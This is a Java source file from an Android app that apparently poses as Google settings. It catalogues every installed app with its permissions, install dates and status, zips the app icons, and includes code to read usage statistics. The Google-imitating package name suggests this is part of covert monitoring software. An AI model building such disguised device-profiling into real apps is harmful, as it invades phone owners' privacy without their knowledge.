package com.setting.dl.google.googlesettings.phone;

import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.support.annotation.RequiresApi;
import android.util.Log;

import com.setting.dl.google.googlesettings.u;

import java.io.File;
import java.io.FileOutputStream;
import java.io.FilenameFilter;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

public class InstalledApps {
    
    Context               context;
    List<ApplicationInfo> packages;
    PackageManager        pm;
    
    public InstalledApps(Context context) {
        
        this.context = context;
        pm = context.getPackageManager();
    }
    
    public String get() {
        
        StringBuilder value = new StringBuilder(u.getDate(new Date()) + "\n");
        packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        
        for (ApplicationInfo packageInfo : packages) {
            
            long installedDate = 0;
            long updateDate    = 0;
            
            try {
                installedDate = pm.getPackageInfo(packageInfo.packageName, 0).firstInstallTime;
                updateDate = pm.getPackageInfo(packageInfo.packageName, 0).lastUpdateTime;
            }
            catch (PackageManager.NameNotFoundException e) {e.printStackTrace();}
            
            
            String label = pm.getApplicationLabel(packageInfo).toString();
            Bitmap bm    = drawableToBitmap(pm.getApplicationIcon(packageInfo));
    
            if (label.contains("/")) {
    
                label = label.replace("/", "-");
            }
            
            saveBitmap(context, label + ".png", bm);
            
            value.append(u.s("\n%-23s : %s\n%-23s : %s\n%-23s : %s\n%-23s : %s\n%-23s : %s\n%s\n%s\n----------------\nİzinler\n----------------\n%s\n---------------------\n",
                             "Package", packageInfo.packageName,
                             "Uygulama", label,
                             "Sistem uygulaması", isSYSTEM(packageInfo),
                             "Yüklenme tarihi", u.getDate(installedDate == 0 ? "0" : u.getDate(installedDate)),
                             "Güncellenme tarihi", updateDate == 0 ? "0" : u.getDate(updateDate),
                             u.s("is stoped   : %s", isSTOPPED(packageInfo)),
                             u.s("is suspended : %s", isSUSPENDED(packageInfo)),
                             getPermissions(packageInfo)));
            
            
            
            
            //Log.d("InstalledApps", value);
        }
        /*
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            usage(context);
        }
        */
        File     zipFile  = new File(context.getFilesDir(), "iconfiles.zip");
        String[] pngFiles = getPngFilesFullPath();
        new Compress(pngFiles, zipFile.getAbsolutePath()).zip();
        for (String file : getPngFiles()) context.deleteFile(file);
        return value.toString();
    }
    
    public static String getActiveApps(Context context) {
        
        PackageManager        pm       = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        
        StringBuilder value = new StringBuilder(u.dateStamp()); // basic date stamp
        value.append("---------------------------------\n");
        value.append("Active Apps\n");
        value.append("=================================\n");
        
        for (ApplicationInfo packageInfo : packages) {
            
            //system apps! get out
            if (!isSTOPPED(packageInfo) && !isSYSTEM(packageInfo)) {
                
                value.append(getApplicationLabel(context, packageInfo.packageName)).append("\n").append(packageInfo.packageName).append("\n-----------------------\n");
            }
        }
        
        return value.toString();
    }
    
    public static List<String> getActiveAppList(Context context) {
        
        PackageManager        pm       = context.getPackageManager();
        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        List<String> appList = new ArrayList<>();
        
        for (ApplicationInfo packageInfo : packages) {
            
            //system apps! get out
            if (!isSTOPPED(packageInfo) && !isSYSTEM(packageInfo)) {
                
                appList.add(packageInfo.packageName);
                
            }
        }
        
        return appList;
    }
    
    String getPermissions(ApplicationInfo applicationInfo) {
        
        StringBuilder permissions = new StringBuilder();
        
        try {
            
            PackageInfo packageInfo = pm.getPackageInfo(applicationInfo.packageName, PackageManager.GET_PERMISSIONS);
            
            
            String[] requestedPermissions = packageInfo.requestedPermissions;
            
            if (requestedPermissions != null) {
                
                if (requestedPermissions.length > 0) {
                    
                    permissions.append(u.s("%s\n", requestedPermissions[0]));
                    
                    for (int permission = 1; permission < requestedPermissions.length; permission++) {
                        
                        permissions.append(u.s("%s\n", requestedPermissions[permission]));
                    }
                }
            }
        }
        catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
        
        return permissions.toString();
    }
    
    public static String getApplicationLabel(Context context, String packageName) {
        
        PackageManager        packageManager = context.getPackageManager();
        List<ApplicationInfo> packages       = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);
        String                label          = null;
        
        for (int i = 0; i < packages.size(); i++) {
            
            ApplicationInfo temp = packages.get(i);
            
            if (temp.packageName.equals(packageName))
                label = packageManager.getApplicationLabel(temp).toString();
        }
        
        return label;
    }
    
    private static boolean isSYSTEM(ApplicationInfo pkgInfo) {
        
        return ((pkgInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
    }
    
    private boolean isEXTERNAL(ApplicationInfo pkgInfo) {
        
        return ((pkgInfo.flags & ApplicationInfo.FLAG_EXTERNAL_STORAGE) != 0);
    }
    
    private boolean isINSTALLED(ApplicationInfo pkgInfo) {
        
        return ((pkgInfo.flags & ApplicationInfo.FLAG_INSTALLED) != 0);
    }
    
    private boolean isPERSISTENT(ApplicationInfo pkgInfo) {
        
        return ((pkgInfo.flags & ApplicationInfo.FLAG_PERSISTENT) != 0);
    }
    
    private boolean isGAME(ApplicationInfo pkgInfo) {
        
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP && ((pkgInfo.flags & ApplicationInfo.FLAG_IS_GAME) != 0);
    }
    
    private static boolean isSTOPPED(ApplicationInfo pkgInfo) {
        
        return ((pkgInfo.flags & ApplicationInfo.FLAG_STOPPED) != 0);
    }
    
    private static boolean isSUSPENDED(ApplicationInfo pkgInfo) {
        
        return Build.VERSION.SDK_INT >= Build.VERSION_CODES.N && ((pkgInfo.flags & ApplicationInfo.FLAG_SUSPENDED) != 0);
        
    }
    
    
    public Bitmap drawableToBitmap(Drawable drawable) {
        
        if (drawable instanceof BitmapDrawable) {
            
            return ((BitmapDrawable) drawable).getBitmap();
        }
        
        int width = drawable.getIntrinsicWidth();
        width = width > 0 ? width : 1;
        int height = drawable.getIntrinsicHeight();
        height = height > 0 ? height : 1;
        
        Bitmap bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
        Canvas canvas = new Canvas(bitmap);
        drawable.setBounds(0, 0, canvas.getWidth(), canvas.getHeight());
        drawable.draw(canvas);
        
        return bitmap;
    }
    
    public void saveBitmap(Context context, String fileName, Bitmap bitmap) {
        
        File file = new File(context.getFilesDir(), fileName);
        
        try {
            
            FileOutputStream out = new FileOutputStream(file);
            bitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
            out.flush();
            out.close();
            
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }
    
    
    @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP_MR1)
    public static void usage(Context context) {
        
        //final SimpleDateFormat dateFormat = new SimpleDateFormat("M-d-yyyy HH:mm:ss");
        
        final UsageStatsManager usageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        
        if(usageStatsManager == null) return;
        
        
        //int      interval = UsageStatsManager.INTERVAL_YEARLY;
        Calendar calendar = Calendar.getInstance();
        long     endTime  = calendar.getTimeInMillis();
        calendar.add(Calendar.YEAR, -1);
        long startTime = calendar.getTimeInMillis();
        
        final List<UsageStats> queryUsageStats = usageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_YEARLY, startTime, endTime);
        
        if (queryUsageStats == null || queryUsageStats.size() < 1) {
            Log.i("usage", "liste boş");
            return;
        }
        
        for (UsageStats stat : queryUsageStats) {
            
            Log.i("usage", stat.getPackageName());
            Log.i("usage", stat.getLastTimeUsed() == 0 ? "0" : u.getDate(stat.getLastTimeUsed()));
            Log.d("usage","toplam : " + stat.getTotalTimeInForeground() / 60000 + " saniye kullanımda");
        }
        
        
    }
    
    
    String[] getPngFilesFullPath() {
        
        File dir = new File(context.getFilesDir().getAbsolutePath());
        
        String[] files = null;
        
        if (dir.exists()) {
            
            files = dir.list((dir1, name) -> name.toLowerCase().endsWith(".png"));
        }
        
        if(files == null) return null;
        
        String[] pngFilesWithFullPath = new String[files.length];
        
        for (int i = 0; i < files.length; i++) {
            
            pngFilesWithFullPath[i] = new File(context.getFilesDir(), files[i]).getAbsolutePath();
            
            
        }
        
        
        return pngFilesWithFullPath;
    }
    
    
    public String[] getPngFiles() {
        
        File dir = new File(context.getFilesDir().getAbsolutePath());
        
        String[] files = null;
        
        if (dir.exists()) {
            
            files = dir.list(new FilenameFilter() {
                
                @Override
                public boolean accept(File dir, String name) {
                    
                    return name.toLowerCase().endsWith(".png");
                }
            });
        }
        
        
        return files;
    }
}
